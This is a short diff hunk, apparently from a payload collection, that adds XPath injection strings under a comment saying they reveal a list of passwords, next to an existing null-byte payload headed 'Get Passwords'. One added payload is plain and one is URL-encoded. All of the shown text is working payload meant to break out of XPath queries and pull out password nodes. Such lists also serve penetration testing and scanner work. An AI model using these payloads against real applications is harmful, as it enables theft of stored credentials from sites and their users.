@@ -6,3 +6,7 @@
 #Get Passwords
 ')] | //password%00
 
+# reveals a list of passwords
+')] | //user/*[contains(*,' 
+%27)%5D/password%20%7C%20a%5Bcontains(a,%27
+
